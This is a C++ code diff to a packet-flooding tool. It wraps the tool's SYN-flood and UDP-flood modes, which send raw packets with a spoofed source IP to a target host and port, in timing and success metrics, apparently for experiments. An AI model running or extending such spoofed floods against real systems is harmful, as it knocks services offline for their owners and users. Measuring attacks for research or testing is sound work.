@@ -401,12 +401,36 @@ int main(int argc, char* argv[]) {
                 }
 
                 int repeat = std::stoi(attack_param);
-                send_raw_syn_packets(
-                    src_ip_to_use, // spoofed source IP
-                    dst_ip_str, // destination IP
-                    dst_port, // destination port
-                    repeat // number of packets
-                );
+                if (metrics) {
+                    std::string exp_id = "DOSS:target=" + attack_target +
+                                         ":repeat=" + std::to_string(repeat);
+                    metrics_open_new_file();
+                    metrics_write_header_if_empty();
+                    MetricsRow row = metrics_begin_row(exp_id);
+                    for (int i = 0; i < repeat; ++i) {
+                        auto t0 = std::chrono::steady_clock::now();
+                        bool success = send_raw_syn_packets(
+                            src_ip_to_use, // spoofed source IP
+                            dst_ip_str, // destination IP
+                            dst_port, // destination port
+                            1 // one packet per metrics sample
+                        );
+                        auto t1 = std::chrono::steady_clock::now();
+                        long long dur_us =
+                            std::chrono::duration_cast<
+                                std::chrono::microseconds>(t1 - t0)
+                                .count();
+                        metrics_add_sample(row, dur_us, success);
+                    }
+                    metrics_end_row_and_write(row);
+                } else {
+                    send_raw_syn_packets(
+                        src_ip_to_use, // spoofed source IP
+                        dst_ip_str, // destination IP
+                        dst_port, // destination port
+                        repeat // number of packets
+                    );
+                }
             } break;
 
             case DOSU: {
@@ -457,12 +481,36 @@ int main(int argc, char* argv[]) {
                     break;
                 }
 
-                send_raw_udp_packets(
-                    src_ip_to_use, // spoofed source IP
-                    dst_ip_str, // destination IP
-                    dst_port, // destination port
-                    repeat // number of packets
-                );
+                if (metrics) {
+                    std::string exp_id = "DOSU:target=" + attack_target +
+                                         ":repeat=" + std::to_string(repeat);
+                    metrics_open_new_file();
+                    metrics_write_header_if_empty();
+                    MetricsRow row = metrics_begin_row(exp_id);
+                    for (int i = 0; i < repeat; ++i) {
+                        auto t0 = std::chrono::steady_clock::now();
+                        bool success = send_raw_udp_packets(
+                            src_ip_to_use, // spoofed source IP
+                            dst_ip_str, // destination IP
+                            dst_port, // destination port
+                            1 // one packet per metrics sample
+                        );
+                        auto t1 = std::chrono::steady_clock::now();
+                        long long dur_us =
+                            std::chrono::duration_cast<
+                                std::chrono::microseconds>(t1 - t0)
+                                .count();
+                        metrics_add_sample(row, dur_us, success);
+                    }
+                    metrics_end_row_and_write(row);
+                } else {
+                    send_raw_udp_packets(
+                        src_ip_to_use, // spoofed source IP
+                        dst_ip_str, // destination IP
+                        dst_port, // destination port
+                        repeat // number of packets
+                    );
+                }
             } break;
 
             case NONE:
